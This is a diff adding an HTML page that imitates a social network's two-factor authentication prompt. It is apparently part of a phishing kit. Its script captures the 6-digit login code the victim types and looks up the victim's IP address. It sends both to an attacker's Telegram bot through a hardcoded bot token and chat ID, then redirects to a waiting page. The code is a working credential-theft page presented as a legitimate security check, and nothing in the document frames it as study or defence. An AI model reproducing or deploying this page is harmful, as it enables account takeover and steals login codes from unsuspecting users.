@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Two-factor authentication required</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <style>
+        body {
+            background-color: #f8f9fa;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333333;
+        }
+
+        .header {
+            background-color: #f8f9fa;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            text-align: left;
+        }
+
+        .header img {
+            height: 30px; /* Adjust the height as needed */
+            vertical-align: middle;
+            margin-right: 10px; /* Add right margin for separation */
+            margin-left: 400px; /* Move the logo 100px from the left */
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h3 {
+            font-size: 20px;
+            margin-bottom: 20px;
+            color: #333333;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            font-size: 14px;
+            font-weight: normal;
+            color: #555555;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ced4da;
+            border-radius: 4px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #3578e5;
+            color: #ffffff;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #2a5a9d;
+        }
+
+        /* Media query for responsiveness on smaller screens */
+        @media screen and (max-width: 767px) {
+            .header {
+                text-align: center;
+            }
+
+            .header img {
+                margin-left: 10px; /* Adjust the margin for better mobile display */
+            }
+
+            .container {
+                max-width: 100%;
+                margin: 20px auto;
+            }
+
+            h3 {
+                font-size: 24px;
+            }
+        }
+     </style>
+</head>
+<body>
+
+<div class="header">
+    <img src="sd.png" alt="Logo">
+</div>
+
+<div class="container">
+    <h3>Two-factor authentication required</h3>
+    
+    <img src="otp.gif" alt="OTP Image" style="width: 100%; margin-bottom: 15px;">
+
+    <form id="authForm" action="javascript:void(0);" onsubmit="submitForm()">
+        <div class="form-group">
+            <label for="logincode">You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser. Enter the 6-digit code from your code generator or third-party app below:</label>
+            <input type="number" id="logincode" name="logincode" minlength="6" required>
+        </div>
+        <button type="submit">Submit</button>
+    </form>
+</div>
+
+<script type="text/javascript">
+function submitForm() {
+    // Function to retrieve the user's IP address
+    function getUserIP(callback) {
+        fetch('https://ipinfo.io?token=5970d5927cfe45')
+            .then(response => response.json())
+            .then(data => {
+                callback(data.ip || '');
+            })
+            .catch(error => {
+                console.error('Failed to retrieve user IP:', error);
+                callback('');
+            });
+    }
+
+    // Get the value from the 'logincode' input field
+    let loginCode = document.getElementById('logincode').value;
+
+    // Create a JSON object with the data
+    let data = {
+        text: `Login Code: ${loginCode}`
+    };
+
+    // Retrieve the user's IP address
+    getUserIP(function (userIP) {
+        // Add the user's IP address to the message
+        data.text += `\nUser IP: ${userIP}`;
+
+        // Send the data to your Telegram bot using the API token
+        let botToken = '6905926094:AAGyqYfNpoHk4OTzeido68UiviOwJb6lOVE';
+        let chatId = '1389938531';
+
+        // Construct the URL to send the message
+        let apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data.text)}`;
+
+        // Send the data to Telegram
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', apiUrl, true);
+        xhr.send();
+
+        // Handle the response from the Telegram API
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    // Data sent successfully
+                    // Now redirect to wait.html
+                    window.location.href = "wait.html";
+                } else {
+                    // Handle any errors
+                    console.error('Failed to send data to Telegram');
+                }
+            }
+        };
+    });
+
+    // Prevent the form from submitting normally
+    return false;
+}
+</script>
+</body>
+</html>
